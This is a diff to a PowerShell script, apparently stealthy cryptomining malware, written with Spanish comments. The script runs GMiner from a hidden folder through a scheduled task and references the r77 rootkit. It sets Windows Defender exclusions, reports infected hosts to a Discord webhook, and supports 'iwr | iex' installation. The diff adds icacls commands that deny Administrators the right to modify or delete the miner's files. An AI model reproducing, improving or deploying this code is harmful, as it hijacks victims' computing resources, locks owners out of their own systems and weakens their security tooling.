@@ -2,9 +2,11 @@
 <#
 .SYNOPSIS
     Deploys and runs GMiner from a hidden system folder using Task Scheduler.
-    Includes Safe Update and r77 Rootkit. (NO Critical Process)
+    Includes Safe Update, File Protection (Admin Lockout), and r77 Rootkit.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
+.EXAMPLE
+    .\Mine.ps1 -Uninstall
 #>
 [CmdletBinding()]
 param(
@@ -13,6 +15,7 @@ param(
     [string]$Algo,
     [string]$Worker,
     [string]$DiscordWebhook,
+    [switch]$Uninstall,
     [switch]$Foreground,
     [switch]$TestWebhook,
     [switch]$Diagnose,
@@ -45,6 +48,29 @@ function Send-DiscordWebhook {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -ErrorAction Stop | Out-Null
         return $true
     } catch { return $false }
+}
+
+function Unprotect-Files {
+    param([string]$Path)
+    if (Test-Path $Path) {
+        Write-Host '[*] Removiendo protección de archivos...'
+        # El parámetro /T aplica el cambio a la carpeta y a TODOS los archivos internos
+        & icacls.exe $Path /inheritance:e /T 2>&1 | Out-Null
+        & icacls.exe $Path /remove:d "*S-1-5-32-544" /T 2>&1 | Out-Null
+    }
+}
+
+function Protect-Files {
+    param([string]$Path)
+    if (Test-Path $Path) {
+        Write-Host '[*] Aplicando protección de archivos (Solo SYSTEM puede editar)...'
+        & icacls.exe $Path /inheritance:r /T 2>&1 | Out-Null
+        & icacls.exe $Path /grant "*S-1-5-18:(OI)(CI)F" /T 2>&1 | Out-Null
+        & icacls.exe $Path /grant "*S-1-5-32-544:(OI)(CI)RX" /T 2>&1 | Out-Null
+        & icacls.exe $Path /deny "*S-1-5-32-544:(OI)(CI)(M,DE)" /T 2>&1 | Out-Null
+        & icacls.exe $Path /grant "*S-1-5-32-545:(OI)(CI)RX" /T 2>&1 | Out-Null
+        Write-Host '[+] Archivos bloqueados para administradores.'
+    }
 }
 
 function Stop-Safe {
@@ -111,6 +137,21 @@ if (-not $Run -and -not $NoElevate) {
     }
 }
 
+# ---------- uninstall -------------------------------------------------------
+if ($Uninstall) {
+    Unprotect-Files -Path $Root
+    Stop-Safe
+    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    
+    try {
+        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
+        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
+    } catch {}
+    
+    Write-Host '[+] Desinstalado correctamente.'
+    return
+}
+
 # ---------- watcher mode ----------------------------------------------------
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
@@ -158,7 +199,7 @@ if ($Run) {
             } catch {}
 
             if (-not $notifiedStart -and $DiscordWebhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Rootkit Activado)*"
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Protecciones Activadas)*"
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
@@ -223,6 +264,9 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
 }
 
 # ---------- install self (Soporte para iwr | iex) ---------------------------
+# Desprotegemos la carpeta temporalmente para poder actualizar el script
+Unprotect-Files -Path $Root
+
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
     Copy-Item $scriptPath $SelfPs -Force
     Unblock-File $SelfPs -ErrorAction SilentlyContinue
@@ -260,7 +304,11 @@ if ($Foreground) {
     Write-Host "[+] Watcher iniciado en segundo plano (PID: $($p.Id))"
 }
 
+# ---------- apply file protection -------------------------------------------
+# Bloqueamos los archivos al final del proceso para que no puedan ser editados ni borrados
+Protect-Files -Path $Root
+
 if ($DiscordWebhook) {
-    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Actualizado e Iniciado."
+    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Actualizado e Iniciado (Archivos Protegidos)."
     Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Actualización Exitosa" -Message $msg -Color 3066993 | Out-Null
 }
